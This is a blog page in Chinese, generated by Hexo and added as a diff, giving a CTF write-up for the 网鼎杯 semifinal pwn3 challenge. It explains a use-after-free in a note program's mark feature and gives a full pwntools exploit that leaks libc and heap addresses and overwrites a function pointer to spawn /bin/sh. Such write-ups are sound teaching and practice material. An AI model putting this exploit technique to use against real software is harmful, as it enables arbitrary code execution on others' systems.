@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>网鼎杯半决赛pwn3 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="主menu的chara结构体1234500000000 chara           struc ; (sizeof=0x18, align=0x8, mappedto_7)00000000 inuse           dq ?00000008 name_ptr        dq ?00000010 type            dq ?00000018 chara">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯半决赛pwn3">
+<meta property="og:url" content="http://yoursite.com/2018/09/20/wdctfpwn2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="主menu的chara结构体1234500000000 chara           struc ; (sizeof=0x18, align=0x8, mappedto_7)00000000 inuse           dq ?00000008 name_ptr        dq ?00000010 type            dq ?00000018 chara">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-07-28T15:51:13.803Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="网鼎杯半决赛pwn3">
+<meta name="twitter:description" content="主menu的chara结构体1234500000000 chara           struc ; (sizeof=0x18, align=0x8, mappedto_7)00000000 inuse           dq ?00000008 name_ptr        dq ?00000010 type            dq ?00000018 chara">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-wdctfpwn2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/09/20/wdctfpwn2/" class="article-date">
+  <time datetime="2018-09-19T16:00:00.000Z" itemprop="datePublished">2018-09-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/PWN/">PWN</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      网鼎杯半决赛pwn3
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="主menu的chara结构体"><a href="#主menu的chara结构体" class="headerlink" title="主menu的chara结构体"></a>主menu的chara结构体</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 chara           struc ; (sizeof=0x18, align=0x8, mappedto_7)</span><br><span class="line">00000000 inuse           dq ?</span><br><span class="line">00000008 name_ptr        dq ?</span><br><span class="line">00000010 type            dq ?</span><br><span class="line">00000018 chara           ends</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>其中inuse限制了不能edit和double free,程序中没有溢出点</li>
+<li>虽然inuse可以不能直接读取内存,但是可以利用堆块包含来进行堆块内容的读取</li>
+<li>可控堆块size的堆,只有name可以利用,然后free到name块,所以通过show来得到&lt;main_arena+0x88&gt;,即为libc的基址</li>
+</ul>
+<h2 id="副menu的结构体"><a href="#副menu的结构体" class="headerlink" title="副menu的结构体"></a>副menu的结构体</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00000000 note_count      dd ?</span><br><span class="line">00000004 note_size       dd ?</span><br><span class="line">00000008 name            db 32 dup(?)</span><br><span class="line">00000028 note_content_ptr dq ?</span><br><span class="line">00000030 note            ends</span><br><span class="line">00000030</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 mark_           struc ; (sizeof=0x18, align=0x8, mappedto_6)</span><br><span class="line">00000000 mark_count      dd ?</span><br><span class="line">00000004 mark_index      dd ?</span><br><span class="line">00000008 mark_conect_info dq ?</span><br><span class="line">00000010 funptr          dq ?</span><br><span class="line">00000018 mark_           ends</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这里又实现了一个典型的记事本服务,而且还多了一项mark功能,此函数里有一根函数指针,所以这里考虑劫持函数指针</li>
+<li>mark是0x18,利用第三个QWORD位的函数指针来打印第二个QWORD位的堆块内容</li>
+<li>并且这个mark存在UAF,我们可以free后利用note部分随意分配size的堆块,再次得到刚才的那个堆块,并直接进行覆盖</li>
+<li>如果想覆盖到函数指针,必须先覆盖字符串指针,所以要想执行system(“/bin/sh”),这里选择note的部分leak_heapbase</li>
+<li>因为name后紧接着堆块指针,并且字符串尾部没有填0,所以可以leak</li>
+<li>下面是exp</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">sys_libc = <span class="number">0x45390</span></span><br><span class="line">libcmain_arena = <span class="number">0x3C4B20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Length of the name :"</span>,str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"The name of character :"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"The type of the character :"</span>,<span class="string">"mozhucy"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which character do you want to eat:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serect</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">"1337"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addN</span><span class="params">(contentsize,name,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"$ "</span>,<span class="string">"new"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"$ note size:"</span>,str(contentsize))</span><br><span class="line">    p.sendlineafter(<span class="string">"$ note name:"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"$ note content:"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showN</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"$ "</span>,<span class="string">"show"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"$ note index:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delN</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"$ "</span>,<span class="string">"delete"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"$ note index:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark</span><span class="params">(index,marks)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"$ "</span>,<span class="string">"mark"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"$ index of note you want to mark:"</span>,str(index))</span><br><span class="line">    <span class="keyword">if</span> len(marks) == <span class="number">32</span>:</span><br><span class="line">        p.sendafter(<span class="string">"$ mark info:"</span>,marks)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">"$ mark info:"</span>,marks)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delmark</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"$ "</span>,<span class="string">"delete_mark"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"$ mark index:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showmark</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"$ "</span>,<span class="string">"show_mark"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"$ mark index:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">"1"</span>*<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">"2"</span>*<span class="number">0x80</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">"1111111"</span>)</span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">"1111111\n"</span>)</span><br><span class="line">    s = p.recv(<span class="number">6</span>) + <span class="string">"\x00\x00"</span></span><br><span class="line">    mainarena = u64(s)</span><br><span class="line">    libcbase = mainarena - libcmain_arena - <span class="number">88</span></span><br><span class="line">    sys = sys_libc + libcbase</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system : 0x%x"</span>%sys</span><br><span class="line"></span><br><span class="line">    <span class="comment">#attack</span></span><br><span class="line">    serect()</span><br><span class="line">    addN(<span class="number">0x30</span>,<span class="string">"flag"</span>*<span class="number">8</span>,<span class="string">"a"</span>*<span class="number">0x30</span>)</span><br><span class="line">    mark(<span class="number">0</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    delmark(<span class="number">0</span>)</span><br><span class="line">    showmark(<span class="number">0</span>)</span><br><span class="line">    showN(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># print p.recv()</span></span><br><span class="line">    p.recvuntil(<span class="string">"flagflagflagflagflagflagflagflag"</span>)</span><br><span class="line">    heapbase = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"/bin/sh : %x"</span>%(heapbase + <span class="number">0x60</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(heapbase + <span class="number">0x60</span>) + p64(sys)</span><br><span class="line">    addN(<span class="number">0x18</span>,<span class="string">"attack"</span>,payload)</span><br><span class="line">    showmark(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># showmark(0)</span></span><br><span class="line">    <span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/09/20/wdctfpwn2/" data-id="cjyn80f8e0020xkthjfqyq81r" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/09/21/easycoin/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          easycoin
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/09/09/sus/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">东南大学练习平台二进制全题解</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CVE/">CVE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Crypto/">Crypto</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/FE/">FE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/RE/">RE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/算法/">算法</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/07/29/深入浅出密码学读书笔记/">深入浅出密码学读书笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/29/逆向工程核心原理笔记/">Reversing-engineering</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/29/看雪ctf4/">2018看雪ctf第四题-密界寻踪</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/29/汇编入门/">CTF二进制总结0X03</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/29/函数调用约定/">Calling Convention</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
